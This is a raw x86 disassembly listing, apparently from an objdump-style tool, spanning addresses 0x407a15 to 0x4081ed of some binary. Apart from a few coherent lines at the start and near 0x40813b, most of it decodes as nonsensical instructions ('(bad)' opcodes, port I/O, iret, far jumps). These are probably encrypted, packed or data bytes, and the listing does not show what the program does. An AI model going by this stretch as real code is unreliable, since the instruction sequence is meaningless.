  407a15:	mov    edx,DWORD PTR [ebp-0x20]
  407a18:	mov    DWORD PTR [ebp-0x2c],0x4ec5
  407a1f:	cmp    eax,DWORD PTR [edx]
  407a21:	je     0x40936a
  407a27:	mov    DWORD PTR [ebp-0xc],0x705fd8f
  407a2e:	lea    eax,[ebp-0xc]
  407a31:	mov    DWORD PTR [ebp-0x10],eax
  407a34:	mov    eax,DWORD PTR [ebp-0x10]
  407a37:	mov    edx,DWORD PTR [eax]
  407a39:	jmp    0x407daf
  407a3e:	sub    eax,0xb2df1e8f
  407a43:	imul   ebp,ebp,0x58ddbe5d
  407a49:	or     BYTE PTR [ebx-0x79],dl
  407a4c:	or     esi,ebp
  407a4e:	sub    esp,edx
  407a50:	jl     0x407ace
  407a52:	xlat   BYTE PTR ds:[ebx]
  407a53:	jns    0x407ad1
  407a55:	jl     0x407a33
  407a57:	inc    edi
  407a58:	pop    ecx
  407a59:	inc    esp
  407a5a:	jnp    0x407a19
  407a5c:	outs   dx,DWORD PTR ds:[esi]
  407a5d:	out    dx,al
  407a5e:	cmp    edx,ecx
  407a60:	stos   DWORD PTR es:[edi],eax
  407a61:	cmc    
  407a62:	sub    al,0x97
  407a64:	lock (bad) 
  407a67:	ret    
  407a68:	pop    ecx
  407a69:	sbb    DWORD PTR [ebx+ecx*8+0x7e],edi
  407a6d:	adc    DWORD PTR [ebx-0x27214890],eax
  407a73:	and    BYTE PTR ds:0x2b2ce348,0xf
  407a7a:	fwait
  407a7b:	push   esp
  407a7c:	js     0x407a8a
  407a7e:	enter  0x2f4a,0xc2
  407a82:	dec    esi
  407a83:	pushf  
  407a84:	in     eax,0x2a
  407a86:	ficomp WORD PTR [esi+0x25]
  407a89:	xor    esi,DWORD PTR [ebx]
  407a8b:	pop    ss
  407a8c:	ds int 0xcd
  407a8f:	jp     0x407a8a
  407a91:	sub    bh,BYTE PTR [eax-0x3766a01f]
  407a97:	(bad)  [ebp-0xaeb1fe]
  407a9d:	and    DWORD PTR [esi+0x20be9b49],edi
  407aa3:	in     al,0xb2
  407aa5:	pushf  
  407aa6:	mov    edx,0x9b2a535c
  407aab:	stos   BYTE PTR es:[edi],al
  407aac:	xor    BYTE PTR [ebp-0x4a],dl
  407aaf:	adc    ecx,ecx
  407ab1:	inc    ebx
  407ab2:	into   
  407ab3:	cmp    al,0x84
  407ab5:	sbb    BYTE PTR [esi],dh
  407ab7:	aam    0xc2
  407ab9:	fsubr  QWORD PTR [edi]
  407abb:	dec    edx
  407abc:	test   al,0xd8
  407abe:	jmp    FWORD PTR [edx+0x139579b5]
  407ac4:	ss ss sbb al,al
  407ac8:	mov    ebx,0xb8807d74
  407acd:	lods   eax,DWORD PTR ds:[esi]
  407ace:	xor    ebp,DWORD PTR [ecx]
  407ad0:	lock icebp 
  407ad2:	jle    0x407ad3
  407ad4:	imul   eax,DWORD PTR [edx-0xc8085ab],0xe9ef324f
  407ade:	xor    DWORD PTR [esi+edi*8],edx
  407ae1:	cmc    
  407ae2:	mov    ch,0x62
  407ae4:	nop
  407ae5:	in     eax,dx
  407ae6:	dec    ebx
  407ae7:	mov    al,ds:0x5b2f08c4
  407aec:	and    ebx,DWORD PTR [ebx+0x15cf7cbc]
  407af2:	scas   eax,DWORD PTR es:[edi]
  407af3:	imul   eax,DWORD PTR [ebx-0x3],0xffffffaf
  407af7:	imul   DWORD PTR ds:0x75f41728
  407afd:	test   eax,0x9d483c10
  407b02:	dec    eax
  407b03:	jnp    0x407ad3
  407b05:	stos   DWORD PTR es:[edi],eax
  407b06:	pop    esp
  407b07:	jge    0x407b6f
  407b09:	aas    
  407b0a:	ja     0x407ac8
  407b0c:	sub    BYTE PTR [edi],dl
  407b0e:	ffreep st(4)
  407b10:	xor    eax,0x1cdcca6c
  407b15:	xchg   DWORD PTR [ebx-0x41efe58],ecx
  407b1b:	mov    eax,0xcbd34096
  407b20:	sahf   
  407b21:	mov    edi,DWORD PTR [edi-0x6098c206]
  407b27:	sbb    eax,0xa0918fb4
  407b2c:	mov    bh,ah
  407b2e:	fucomip st,st(0)
  407b30:	cmp    DWORD PTR [eax],esp
  407b32:	in     eax,0x79
  407b34:	mov    bh,0xf5
  407b36:	lea    edx,[ebx]
  407b38:	je     0x407ac5
  407b3a:	mov    eax,0xfea8c486
  407b3f:	ja     0x407b6f
  407b41:	imul   esi
  407b43:	stos   DWORD PTR es:[edi],eax
  407b44:	lods   eax,DWORD PTR ds:[esi]
  407b45:	inc    eax
  407b46:	pop    ebp
  407b47:	stc    
  407b48:	jb     0x407b73
  407b4a:	out    0xf6,al
  407b4c:	add    DWORD PTR [edi-0x52b366de],0x1ac74672
  407b56:	adc    DWORD PTR [edx+ebx*1+0x37fa3c61],esi
  407b5d:	ja     0x407b46
  407b5f:	out    0x93,eax
  407b61:	in     eax,dx
  407b62:	add    al,0x45
  407b64:	sbb    ebx,ebx
  407b66:	inc    ebp
  407b67:	repnz ins DWORD PTR es:[edi],dx
  407b69:	jl     0x407ba1
  407b6b:	cmp    dh,dh
  407b6d:	push   es
  407b6e:	sub    ch,bh
  407b70:	xchg   BYTE PTR [ebx-0x64],dl
  407b73:	xchg   esi,eax
  407b74:	sar    BYTE PTR [ebx-0x3f6226bc],1
  407b7a:	xchg   BYTE PTR [esi-0x147f3805],dh
  407b80:	mov    edi,0xc6bb853d
  407b85:	ror    edx,0xc9
  407b88:	pop    ebp
  407b89:	iret   
  407b8a:	inc    esi
  407b8b:	iret   
  407b8c:	mov    eax,0xd8388ed9
  407b91:	add    DWORD PTR [ecx+0x12],0x91b89428
  407b98:	mov    eax,ds:0x5a16e3c4
  407b9d:	stos   BYTE PTR es:[edi],al
  407b9e:	mov    gs,WORD PTR [eax]
  407ba0:	aam    0x4d
  407ba2:	into   
  407ba3:	shl    DWORD PTR [eax],cl
  407ba5:	inc    ebx
  407ba6:	push   0x5b
  407ba8:	sahf   
  407ba9:	outs   dx,BYTE PTR ds:[esi]
  407baa:	push   ecx
  407bab:	(bad)  
  407bac:	int    0x39
  407bae:	adc    eax,0x18389222
  407bb3:	jbe    0x407bd5
  407bb5:	cmp    ebp,DWORD PTR [ebp-0x73]
  407bb8:	jne    0x407c05
  407bba:	cs push es
  407bbc:	pop    eax
  407bbd:	push   0x5074c917
  407bc2:	mov    ch,0x76
  407bc4:	test   DWORD PTR [ebp+0x17],edi
  407bc7:	hlt    
  407bc8:	leave  
  407bc9:	add    cl,BYTE PTR [esi]
  407bcb:	mov    eax,es
  407bcd:	lds    ebx,FWORD PTR [esi]
  407bcf:	cwde   
  407bd0:	jl     0x407bf5
  407bd2:	stos   DWORD PTR es:[edi],eax
  407bd3:	ss pop es
  407bd5:	jl     0x407b5f
  407bd7:	or     al,al
  407bd9:	jp     0x407bb6
  407bdb:	pop    edi
  407bdc:	leave  
  407bdd:	cmp    ch,BYTE PTR [esi-0x57]
  407be0:	arpl   WORD PTR [edi+ebx*1+0x27126be4],sp
  407be7:	pop    esi
  407be8:	cmp    BYTE PTR [edi+0x3],al
  407beb:	or     al,0x20
  407bed:	mov    edi,0x9cd72e4c
  407bf2:	inc    ebp
  407bf3:	adc    eax,DWORD PTR ds:0x8da1d227
  407bf9:	into   
  407bfa:	cmc    
  407bfb:	mov    bh,0x97
  407bfd:	mov    BYTE PTR [eax+0x7e37eae1],dl
  407c03:	xchg   esi,eax
  407c04:	jne    0x407bb0
  407c06:	mov    dh,0x2
  407c08:	xor    al,BYTE PTR [eax]
  407c0a:	in     eax,0x6b
  407c0c:	cmp    al,dh
  407c0e:	(bad)  
  407c0f:	call   0x368fc711
  407c14:	add    eax,0x6707df
  407c19:	test   eax,0x26b1c109
  407c1e:	nop
  407c1f:	sar    BYTE PTR [ebp-0x2473d29a],cl
  407c25:	ret    0x4847
  407c28:	add    eax,DWORD PTR ds:0xfc467cb
  407c2e:	cmp    al,0xa4
  407c30:	out    dx,al
  407c31:	(bad)  
  407c32:	daa    
  407c33:	ins    BYTE PTR es:[edi],dx
  407c34:	push   cs
  407c35:	pop    ebx
  407c36:	dec    edx
  407c37:	mov    al,0xb3
  407c39:	and    dl,BYTE PTR ds:0xc6904fbe
  407c3f:	adc    edx,DWORD PTR [ecx]
  407c41:	push   ebp
  407c42:	and    al,0xc1
  407c44:	push   esi
  407c45:	jmp    0xcd56:0x6e7d5302
  407c4c:	xlat   BYTE PTR ds:[ebx]
  407c4d:	cld    
  407c4e:	or     dh,BYTE PTR [edi]
  407c50:	and    DWORD PTR [esi-0x34],ebp
  407c53:	sti    
  407c54:	cmp    dl,BYTE PTR [edi-0xc]
  407c57:	or     eax,0x8ac1d55b
  407c5c:	dec    ebx
  407c5d:	sti    
  407c5e:	fwait
  407c5f:	in     eax,dx
  407c60:	fldcw  WORD PTR [edx-0x15ac4bb2]
  407c66:	not    BYTE PTR [ebx]
  407c68:	sbb    al,0x95
  407c6a:	sub    esi,ebx
  407c6c:	jne    0x407c33
  407c6e:	xchg   esp,eax
  407c6f:	pop    esp
  407c70:	cmp    esp,edi
  407c72:	test   DWORD PTR ds:0x609b95ce,edi
  407c78:	jns    0x407c1c
  407c7a:	adc    al,0xde
  407c7c:	in     al,dx
  407c7d:	fldl2t 
  407c7f:	jge    0x407c3a
  407c81:	jmp    0x9dd9fbcf
  407c86:	or     DWORD PTR [edx-0x1c],edx
  407c89:	or     eax,0xffe2d635
  407c8e:	(bad)  
  407c8f:	sbb    dh,BYTE PTR [ebx+ecx*1+0x5e]
  407c93:	or     al,0xc0
  407c95:	inc    esi
  407c96:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407c97:	fbstp  TBYTE PTR [edx]
  407c99:	inc    edi
  407c9a:	pop    ecx
  407c9b:	popf   
  407c9c:	aas    
  407c9d:	mov    ds:0xd62534c9,al
  407ca2:	jmp    0x407cf1
  407ca4:	stc    
  407ca5:	imul   BYTE PTR [edi]
  407ca7:	ja     0x407c49
  407ca9:	repnz mov ch,bl
  407cac:	pushf  
  407cad:	retf   
  407cae:	int3   
  407caf:	push   esp
  407cb0:	inc    ebp
  407cb1:	out    0x71,eax
  407cb3:	aaa    
  407cb4:	and    bl,BYTE PTR [esi+0x27c677c2]
  407cba:	nop
  407cbb:	fild   WORD PTR [edx-0x55016023]
  407cc1:	cli    
  407cc2:	out    0xc7,eax
  407cc4:	orps   xmm7,xmm3
  407cc7:	jb     0x407c84
  407cc9:	inc    eax
  407cca:	or     al,0x74
  407ccc:	cmp    BYTE PTR [edi],0x34
  407ccf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407cd0:	mov    esi,0xc7bb93e3
  407cd5:	out    0x57,al
  407cd7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407cd8:	gs cli 
  407cda:	push   esp
  407cdb:	pop    edi
  407cdc:	mov    edx,0xe7e3e80
  407ce1:	xor    ebp,ebp
  407ce3:	js     0x407d31
  407ce5:	and    al,0xae
  407ce7:	lods   al,BYTE PTR ds:[esi]
  407ce8:	stc    
  407ce9:	js     0x407c96
  407ceb:	mov    bl,0x8e
  407ced:	pusha  
  407cee:	mov    eax,0x8e9497ef
  407cf3:	sti    
  407cf4:	cmp    BYTE PTR [ebx],0xd9
  407cf7:	sub    BYTE PTR [edi+edx*2],0x49
  407cfb:	(bad)  
  407cfc:	fcmovnbe st,st(4)
  407cfe:	jo     0x407d29
  407d00:	inc    ebp
  407d01:	retf   0xea97
  407d04:	inc    ebx
  407d05:	sahf   
  407d06:	add    al,0x33
  407d08:	sahf   
  407d09:	mov    ds:0x520b5281,al
  407d0e:	jno    0x407d23
  407d10:	jns    0x407d4f
  407d12:	pandn  mm0,mm2
  407d15:	adc    al,0x4c
  407d17:	mov    al,0xb6
  407d19:	push   ebp
  407d1a:	mov    WORD PTR [eax+ebp*1-0x22d4ace1],ss
  407d21:	sub    eax,0x35aff9e2
  407d26:	test   al,0x93
  407d28:	js     0x407cf1
  407d2a:	and    al,0xc2
  407d2c:	add    DWORD PTR [eax-0x527fed26],ebp
  407d32:	push   esi
  407d33:	sar    DWORD PTR [esi-0x1f198bcf],0x58
  407d3a:	je     0x407db0
  407d3c:	or     al,0x6f
  407d3e:	and    ch,cl
  407d40:	add    ebx,DWORD PTR [edx-0x4f]
  407d43:	aaa    
  407d44:	jns    0x407d7c
  407d46:	jp     0x407ce5
  407d48:	shl    DWORD PTR [ecx],0x6c
  407d4b:	enter  0x481f,0xa8
  407d4f:	or     esp,edx
  407d51:	(bad)  
  407d52:	jns    0x407dc3
  407d54:	mov    ebp,0xea1b99f5
  407d59:	mov    ebp,0x2030b5
  407d5e:	ss test ecx,ebp
  407d61:	cdq    
  407d62:	fmul   QWORD PTR [edi+0x5d]
  407d65:	in     eax,0xcf
  407d67:	ror    DWORD PTR [edx+0x73fd04e0],0xe2
  407d6e:	mov    dh,BYTE PTR [edi]
  407d70:	(bad)  
  407d71:	xor    ah,BYTE PTR [ecx+0x13]
  407d74:	sub    bl,ch
  407d76:	sti    
  407d77:	dec    esi
  407d78:	rdmsr  
  407d7a:	adc    al,cl
  407d7c:	fadd   DWORD PTR [esi+edi*4-0x61c09c84]
  407d83:	adc    al,0x7e
  407d86:	dec    ebx
  407d87:	xor    esp,ebp
  407d89:	ret    0x9f00
  407d8c:	xchg   edx,eax
  407d8d:	ret    
  407d8e:	lock push ebx
  407d90:	and    DWORD PTR [edx],esi
  407d92:	mov    ah,0xd0
  407d94:	and    al,0xf5
  407d96:	mov    ebx,0xefc3bb33
  407d9b:	push   eax
  407d9c:	or     ah,BYTE PTR [esi-0x31]
  407d9f:	jl     0x407dcf
  407da1:	fidiv  DWORD PTR [edx-0x56c0c90f]
  407da7:	or     edx,DWORD PTR [esi+0x59]
  407daa:	(bad)  
  407dac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407dad:	pop    edx
  407dae:	imul   DWORD PTR [ecx-0x2e]
  407db1:	call   0x8a391c5f
  407db6:	adc    BYTE PTR [ebx-0x67c20bbb],cl
  407dbc:	xor    BYTE PTR [ebx],dl
  407dbe:	pop    eax
  407dbf:	jmp    0x408135
  407dc4:	cwde   
  407dc5:	mov    eax,ds:0x5b4dbc42
  407dca:	mov    ds:0x4fdb206d,al
  407dcf:	or     al,dh
  407dd1:	xchg   edi,eax
  407dd2:	jl     0x407e1a
  407dd4:	adc    cl,0x7c
  407dd7:	jl     0x407db0
  407dd9:	jns    0x407e57
  407ddb:	jl     0x407e48
  407ddd:	(bad)  
  407dde:	xchg   edx,eax
  407ddf:	fcmovb st,st(0)
  407de1:	iret   
  407de2:	and    DWORD PTR [ebp-0x3a],esi
  407de5:	sbb    al,0x29
  407de7:	xor    eax,0x86c98022
  407dec:	aas    
  407ded:	mov    ebx,0xe382f470
  407df2:	cld    
  407df3:	mul    DWORD PTR [edx]
  407df5:	add    esp,DWORD PTR [eax]
  407df7:	mov    al,ds:0xd616e1ba
  407dfc:	stc    
  407dfd:	sub    BYTE PTR cs:[eax+0x7085000c],0x73
  407e05:	xor    DWORD PTR [ecx],edx
  407e07:	lds    edx,FWORD PTR [eax+0x302b1a10]
  407e0d:	out    dx,eax
  407e0e:	mov    bh,0xa9
  407e10:	adc    esp,DWORD PTR [ebp-0x267f706d]
  407e16:	pop    edi
  407e17:	retf   0xe709
  407e1a:	out    0xb9,eax
  407e1c:	mov    ds:0x7e590f7,al
  407e21:	xor    al,0x88
  407e23:	cmp    al,0x75
  407e25:	push   es
  407e26:	sub    al,0x4c
  407e28:	daa    
  407e29:	cmp    eax,0x67bcdacb
  407e2e:	in     al,dx
  407e2f:	cmp    cl,BYTE PTR [edi]
  407e31:	es jmp 0x792e9206
  407e37:	mov    eax,ds:0xa8983fe4
  407e3c:	fimul  DWORD PTR [esp+ebx*2+0x667b6a87]
  407e43:	repz rcr BYTE PTR [eax+0x5629031],1
  407e4a:	jge    0x407ddb
  407e4c:	stos   DWORD PTR es:[edi],eax
  407e4d:	shl    BYTE PTR [eax+0x6c],cl
  407e50:	mov    eax,ds:0x61b83732
  407e55:	stc    
  407e56:	clc    
  407e57:	hlt    
  407e58:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407e59:	or     dh,bh
  407e5b:	add    al,0x84
  407e5d:	jae    0x407ed7
  407e5f:	xchg   ebp,eax
  407e60:	(bad)  
  407e61:	ins    BYTE PTR es:[edi],dx
  407e62:	out    0xd7,al
  407e64:	xlat   BYTE PTR ds:[ebx]
  407e65:	sahf   
  407e66:	adc    bh,BYTE PTR [edi+0x45]
  407e69:	in     eax,0x19
  407e6b:	cwde   
  407e6c:	or     ch,BYTE PTR [esi]
  407e6e:	std    
  407e6f:	jo     0x407ed6
  407e71:	fs icebp 
  407e73:	pop    esi
  407e74:	push   eax
  407e75:	sar    dl,1
  407e77:	call   0x1db3ce26
  407e7c:	or     al,0x29
  407e7e:	outs   dx,DWORD PTR ds:[esi]
  407e7f:	sbb    eax,0xcb5eb3eb
  407e84:	and    esp,esi
  407e86:	jnp    0x407e67
  407e88:	stc    
  407e89:	xchg   esi,eax
  407e8a:	cmp    DWORD PTR [eax+0x7eea7a8],ecx
  407e90:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407e91:	xchg   esp,edx
  407e93:	lods   al,BYTE PTR ds:[esi]
  407e94:	sbb    edx,DWORD PTR [esi-0x25]
  407e97:	fild   DWORD PTR [ecx-0x6]
  407e9a:	test   eax,0x70819408
  407e9f:	cmp    ebp,DWORD PTR [ecx]
  407ea1:	dec    ecx
  407ea2:	cmc    
  407ea3:	mov    al,ds:0xaf4d9e01
  407ea8:	inc    edi
  407ea9:	gs dec ecx
  407eab:	out    dx,al
  407eac:	stos   BYTE PTR es:[edi],al
  407ead:	cwde   
  407eae:	(bad)  
  407eb0:	into   
  407eb1:	sahf   
  407eb2:	je     0x407e94
  407eb4:	inc    ecx
  407eb5:	mov    BYTE PTR [ecx],0xe8
  407eb8:	lods   al,BYTE PTR ds:[esi]
  407eb9:	(bad)  
  407eba:	dec    edi
  407ebb:	push   esi
  407ebc:	pop    ss
  407ebd:	ror    edi,cl
  407ebf:	jmp    0x407e4f
  407ec1:	cs pop edi
  407ec3:	or     al,0x1
  407ec5:	(bad)  
  407ec6:	jb     0x407ebd
  407ec8:	pop    esi
  407ec9:	mov    gs,ebx
  407ecb:	fsub   QWORD PTR [ebx]
  407ecd:	mov    edi,0x50f5eedf
  407ed2:	stc    
  407ed3:	cdq    
  407ed4:	call   0x7e03c25
  407ed9:	fld    QWORD PTR ds:0x1a81634
  407edf:	test   al,0xdb
  407ee1:	cmp    dh,cl
  407ee3:	shl    dl,1
  407ee5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407ee6:	jle    0x407e9c
  407ee8:	mov    al,0xf1
  407eea:	ds jl  0x407f42
  407eed:	inc    ecx
  407eee:	xchg   BYTE PTR [edi-0x70],dl
  407ef1:	je     0x407ebc
  407ef3:	lods   eax,DWORD PTR ds:[esi]
  407ef4:	jg     0x407e96
  407ef6:	and    dl,BYTE PTR [ebp+eiz*2-0x1a93939a]
  407efd:	loope  0x407f5c
  407eff:	jmp    0x407f77
  407f01:	stos   DWORD PTR es:[edi],eax
  407f02:	mov    ecx,0xc394d0b2
  407f07:	mov    gs,WORD PTR [di]
  407f0a:	sbb    al,0x32
  407f0c:	shl    BYTE PTR [ebx-0x65881ef1],1
  407f12:	inc    ecx
  407f13:	mov    ds:0xdc12b64c,eax
  407f18:	and    BYTE PTR [eax+0x76bb9714],bl
  407f1e:	sbb    DWORD PTR [ebx],ecx
  407f20:	mov    esp,0x63f946e7
  407f25:	cld    
  407f26:	ficomp WORD PTR cs:[si]
  407f2a:	in     al,0x8
  407f2c:	and    BYTE PTR [esi+0x6e7d43c8],0x29
  407f33:	push   0x12
  407f35:	fcomp  DWORD PTR [eax+ebx*8]
  407f38:	push   esi
  407f39:	sbb    eax,0xd260237a
  407f3e:	xchg   esi,eax
  407f3f:	dec    edi
  407f40:	push   edx
  407f41:	fwait
  407f42:	cmp    cl,BYTE PTR ds:0xfdc455dc
  407f48:	imul   esp,DWORD PTR [ebx+0x64c275ec],0xedc8f806
  407f52:	hlt    
  407f53:	div    BYTE PTR [ebp-0x36ceaee3]
  407f59:	pushf  
  407f5a:	xchg   ecx,eax
  407f5b:	cmc    
  407f5c:	out    dx,eax
  407f5d:	or     ebx,DWORD PTR [esi+0x1391b9d4]
  407f63:	(bad)  
  407f64:	stc    
  407f65:	sub    BYTE PTR ds:0xdecf107c,al
  407f6b:	rol    BYTE PTR [eax-0x33],cl
  407f6e:	xchg   ebx,eax
  407f6f:	shr    DWORD PTR [ebx+0x37],cl
  407f72:	mov    DWORD PTR [eax+ebp*2-0x42],edx
  407f76:	imul   ebx,DWORD PTR [ebp-0x275b5536],0xc5b70864
  407f80:	push   esi
  407f81:	mov    ebp,0x80deaf61
  407f86:	sbb    DWORD PTR [edi+edx*1+0x522688e2],ebx
  407f8d:	push   es
  407f8e:	mov    ebp,0xc3b50894
  407f93:	rol    BYTE PTR ds:0x23cbebf0,0x9c
  407f9a:	(bad)  
  407f9c:	mov    dh,0x70
  407f9e:	dec    esi
  407f9f:	aam    0x46
  407fa1:	sti    
  407fa2:	push   ss
  407fa3:	ins    DWORD PTR es:[edi],dx
  407fa4:	mov    edx,0xb24db6e9
  407fa9:	sbb    dl,cl
  407fab:	int3   
  407fac:	jge    0x407fd7
  407fae:	js     0x407fd5
  407fb0:	int3   
  407fb1:	aaa    
  407fb2:	xor    ebp,DWORD PTR [ebp+0x6411e48e]
  407fb8:	sbb    eax,0x9898564d
  407fbd:	xchg   edi,eax
  407fbe:	cmp    al,0x3b
  407fc0:	dec    esp
  407fc1:	sti    
  407fc2:	xchg   edi,eax
  407fc3:	cpuid  
  407fc5:	push   esi
  407fc7:	cdq    
  407fc8:	loopne 0x407fb4
  407fca:	mov    al,cs:0xf686404d
  407fd0:	add    dl,bh
  407fd2:	ds (bad) 
  407fd4:	fwait
  407fd5:	retf   
  407fd6:	shr    BYTE PTR [ecx-0x4d],0xab
  407fda:	int    0xe4
  407fdc:	cld    
  407fdd:	in     eax,0x4
  407fdf:	dec    BYTE PTR [esi+esi*1-0x6c8645b9]
  407fe6:	aas    
  407fe7:	push   ebx
  407fe8:	not    BYTE PTR [ebp+0x1d]
  407feb:	sbb    al,BYTE PTR [edi]
  407fed:	or     DWORD PTR [ebx+eax*2],ecx
  407ff0:	mov    al,0xa2
  407ff2:	push   eax
  407ff3:	add    BYTE PTR [ecx+0x1da0b7b8],0x6c
  407ffa:	adc    bl,ch
  407ffc:	sbb    bl,BYTE PTR [ecx+0x73]
  407fff:	inc    esi
  408000:	test   DWORD PTR [esi+0x45],eax
  408003:	out    0xf1,eax
  408005:	inc    eax
  408006:	retf   0xb768
  408009:	cs mov ecx,0x65116994
  40800f:	push   cs
  408010:	xlat   BYTE PTR ds:[ebx]
  408011:	(bad)  
  408012:	cwde   
  408013:	fimul  DWORD PTR [ebx+0x63d0ef5a]
  408019:	cmp    DWORD PTR [edi+edi*8-0x7e],esp
  40801d:	(bad)  
  40801e:	jmp    0x40809b
  408020:	dec    esp
  408021:	pushf  
  408022:	pop    ecx
  408023:	fnop   
  408025:	mov    ds:0xf5e78451,al
  40802a:	std    
  40802b:	popf   
  40802c:	mov    ebx,0x4e450e6b
  408031:	dec    esp
  408032:	pop    ecx
  408033:	sbb    dl,al
  408035:	lds    esi,FWORD PTR [ecx+ecx*2-0x2eea8b98]
  40803c:	fnsave [esi-0x6dd028ae]
  408042:	jbe    0x407ffd
  408044:	xor    BYTE PTR [eax],ah
  408046:	in     eax,0x3f
  408048:	sub    eax,0x670b17d4
  40804d:	ja     0x4080c7
  40804f:	and    DWORD PTR [edi-0x675fde63],eax
  408055:	scas   al,BYTE PTR es:[edi]
  408056:	out    0xec,eax
  408058:	sbb    DWORD PTR [esi-0x1f],esp
  40805b:	std    
  40805c:	and    eax,0x66805b2a
  408061:	arpl   di,si
  408063:	dec    ebx
  408064:	loop   0x40808e
  408066:	xchg   ch,al
  408068:	sbb    al,0x6a
  40806a:	inc    esp
  40806b:	fldcw  WORD PTR [esi]
  40806d:	(bad)  
  40806e:	mov    bh,0x9b
  408070:	jne    0x4080b7
  408072:	sbb    al,0xa6
  408074:	jecxz  0x40806b
  408076:	push   ebp
  408077:	xchg   edi,eax
  408078:	(bad)  
  408079:	mov    al,0xe3
  40807b:	popf   
  40807c:	outs   dx,BYTE PTR ds:[esi]
  40807d:	arpl   WORD PTR [esi],sp
  40807f:	dec    edi
  408080:	aas    
  408081:	and    cl,BYTE PTR [esi+0x6862d161]
  408087:	push   edi
  408088:	jg     0x408012
  40808a:	and    eax,0x461bad51
  40808f:	mov    ebp,0xe9a08366
  408094:	mov    ch,ah
  408096:	sub    al,0x5c
  408098:	inc    esp
  408099:	fisttp WORD PTR [ecx]
  40809b:	cmp    ch,bh
  40809d:	push   edx
  40809e:	aas    
  40809f:	push   ds
  4080a0:	test   ebx,0xaa0c9af3
  4080a6:	aaa    
  4080a7:	adc    DWORD PTR [ecx+edx*1-0x2cbb883],edi
  4080ae:	imul   al
  4080b0:	xor    ebx,edi
  4080b2:	dec    eax
  4080b3:	push   0xb0a87e00
  4080b8:	dec    esp
  4080b9:	jecxz  0x408071
  4080bb:	lods   al,BYTE PTR fs:[esi]
  4080bd:	pop    edi
  4080be:	cdq    
  4080bf:	add    BYTE PTR [ebp-0x7c],dh
  4080c2:	popf   
  4080c3:	inc    esp
  4080c4:	push   ebp
  4080c5:	xor    DWORD PTR [ecx-0x5a],esp
  4080c8:	sub    dh,BYTE PTR [esi-0x19e6255c]
  4080ce:	pop    ecx
  4080cf:	push   ebx
  4080d0:	adc    eax,0xab65c6c0
  4080d5:	ret    0x2b1a
  4080d8:	(bad)  
  4080d9:	daa    
  4080da:	rcl    ebx,0xec
  4080dd:	je     0x40814e
  4080df:	xchg   dh,al
  4080e1:	adc    DWORD PTR [edx-0xb],edi
  4080e4:	sub    edx,DWORD PTR [ecx+0x2765fefb]
  4080ea:	leave  
  4080eb:	xchg   edi,eax
  4080ec:	data16 rcl BYTE PTR [edi],1
  4080ef:	or     BYTE PTR [ebp+0x23],dl
  4080f2:	fimul  DWORD PTR [esi-0x59]
  4080f5:	lods   al,BYTE PTR ds:[esi]
  4080f6:	and    edi,ecx
  4080f8:	mov    BYTE PTR [esi-0x1a763e5d],0xb8
  4080ff:	jb     0x40810d
  408101:	stos   BYTE PTR es:[edi],al
  408102:	hlt    
  408103:	cmp    ebp,eax
  408105:	jae    0x4080ac
  408107:	pusha  
  408108:	sbb    al,0xcd
  40810a:	pushf  
  40810b:	lock fisubr WORD PTR [ecx-0x63cb8a49]
  408112:	call   0xa407550f
  408117:	mov    WORD PTR [edi+0x75],?
  40811a:	jns    0x408181
  40811c:	xchg   DWORD PTR ss:[edi],esi
  40811f:	nop
  408120:	data16 stos BYTE PTR es:[edi],al
  408122:	push   ebp
  408123:	pop    ebx
  408124:	sub    bl,BYTE PTR [ebp-0x70e945c3]
  40812a:	push   0x3453b0d0
  40812f:	adc    al,BYTE PTR [eax-0x7bb5e3a6]
  408135:	je     0x4084c8
  40813b:	mov    eax,DWORD PTR [ebp-0x1c]
  40813e:	or     DWORD PTR [eax],0x60751c98
  408144:	jmp    0x4084ba
  408149:	pop    edx
  40814a:	jns    0x4080ea
  40814c:	fs bound ecx,QWORD PTR gs:[di]
  408151:	add    ebp,ebp
  408153:	push   ebx
  408154:	sbb    esp,ecx
  408156:	lea    ecx,[edi+eax*4+0x7c7cd25b]
  40815d:	xlat   BYTE PTR ds:[ebx]
  40815e:	jns    0x4081dc
  408160:	jl     0x4080fd
  408162:	pop    edx
  408163:	push   ecx
  408164:	pop    ss
  408165:	sub    ch,BYTE PTR ds:0x91d40bf3
  40816b:	xchg   esp,eax
  40816c:	jp     0x4081c5
  40816e:	xor    eax,0x1c54b3a2
  408173:	psllq  mm3,mm1
  408176:	out    0x53,al
  408178:	push   esp
  408179:	xor    al,0x5c
  40817b:	or     bl,dh
  40817d:	into   
  40817e:	xchg   edx,eax
  40817f:	cmp    al,0xf9
  408181:	into   
  408182:	aad    0xcd
  408184:	cmp    al,BYTE PTR [esi+edx*4]
  408187:	std    
  408188:	arpl   WORD PTR [esi+ebx*1-0x55],bp
  40818c:	sbb    DWORD PTR [eax+0x1f880955],ecx
  408192:	(bad)  
  408193:	in     eax,dx
  408194:	into   
  408195:	add    BYTE PTR [esi],bl
  408197:	sbb    al,0xac
  408199:	popa   
  40819a:	and    DWORD PTR [esi+0x59fe7d8a],0x37
  4081a1:	cmp    eax,0xfa8ed08a
  4081a6:	mov    eax,0xdf709b42
  4081ab:	sahf   
  4081ac:	pusha  
  4081ad:	dec    edx
  4081ae:	stc    
  4081af:	mov    bl,0x77
  4081b1:	mov    edi,0xb266c777
  4081b6:	xor    eax,0x6e555508
  4081bb:	pop    eax
  4081bc:	rol    DWORD PTR [ebp-0x22],1
  4081bf:	loopne 0x408195
  4081c1:	ss scas al,BYTE PTR es:[edi]
  4081c3:	sub    eax,0xcfb62afd
  4081c8:	cmc    
  4081c9:	hlt    
  4081ca:	and    eax,0xbf129db9
  4081cf:	(bad)  [esi]
  4081d1:	adc    ebx,DWORD PTR [ecx-0x3d0556b4]
  4081d7:	xchg   edx,eax
  4081d8:	test   al,0x8c
  4081da:	xlat   BYTE PTR ds:[ebx]
  4081db:	and    BYTE PTR [edi],ch
  4081dd:	out    dx,eax
  4081de:	fistp  WORD PTR [esi]
  4081e0:	xchg   esp,eax
  4081e1:	pop    ecx
  4081e2:	jne    0x4081c6
  4081e4:	or     al,0x3e
  4081e6:	jmp    0x5989:0x16f33a7c
  4081ed:	push   esi
